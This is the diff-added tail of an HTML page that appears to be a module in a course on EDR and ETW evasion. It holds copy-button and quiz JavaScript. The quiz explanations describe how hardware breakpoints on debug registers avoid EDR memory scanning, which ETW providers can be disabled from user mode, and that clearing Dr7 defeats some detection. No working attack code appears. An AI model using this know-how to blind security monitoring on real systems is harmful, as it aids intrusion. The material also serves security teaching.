+            <a href="MODULE_11_AMSI.html">← Module 11</a>
+            <a href="MODULE_13_EDR_EVASION.html">Module 13 →</a>
+        </div>
+    </div>
+
+    <script>
+        // Copy buttons for code blocks
+        document.querySelectorAll('.code-block').forEach(block => {
+            const btn = document.createElement('button');
+            btn.className = 'copy-btn';
+            btn.textContent = 'COPY';
+            btn.addEventListener('click', () => {
+                const text = block.textContent.replace('COPY', '').trim();
+                navigator.clipboard.writeText(text).then(() => {
+                    btn.textContent = 'COPIED!';
+                    setTimeout(() => btn.textContent = 'COPY', 2000);
+                });
+            });
+            block.appendChild(btn);
+        });
+
+        // Quiz functionality
+        function checkAnswer(option, quizId) {
+            const container = document.getElementById(quizId);
+            const options = container.querySelectorAll('.quiz-option');
+            const feedback = document.getElementById('feedback-' + quizId);
+            
+            // Disable all options
+            options.forEach(opt => {
+                opt.style.pointerEvents = 'none';
+                if (opt.dataset.correct === 'true') {
+                    opt.classList.add('correct');
+                } else if (opt === option) {
+                    opt.classList.add('wrong');
+                }
+            });
+            
+            // Show feedback
+            feedback.classList.add('show');
+            if (option.dataset.correct === 'true') {
+                feedback.classList.add('correct');
+                feedback.innerHTML = '<strong>✓ CORRECT</strong><br>' + getExplanation(quizId, true);
+            } else {
+                feedback.classList.add('wrong');
+                feedback.innerHTML = '<strong>✗ WRONG</strong><br>' + getExplanation(quizId, false);
+            }
+        }
+
+        function getExplanation(quizId, isCorrect) {
+            const explanations = {
+                'quiz-1': 'Hardware breakpoints use CPU debug registers (DR0-DR3), not memory modifications. EDR memory scanners compare ntdll.dll in memory to disk — since no memory was changed, the hashes match. The breakpoint exists in the CPU, invisible to software.',
+                'quiz-2': 'Provider disable uses EventRegister/EventUnregister, which are user-mode APIs. Kernel-mode providers (like Sysmon, Windows Defender) run in the kernel and cannot be disabled from user space. You would need a kernel driver or hypervisor access to disable them.',
+                'quiz-3': 'Memory scanning (A) misses hardware breakpoints because no memory is modified. ETW session analysis (C) misses them because sessions stay active. The Event Log service (D) is irrelevant. Only kernel callbacks that monitor debug register access (B) can detect hardware breakpoints — and even then, the attacker can clear Dr7 before the check.'
+            };
+            return explanations[quizId] || 'Keep studying!';
+        }
+    </script>
 </body>
 </html>
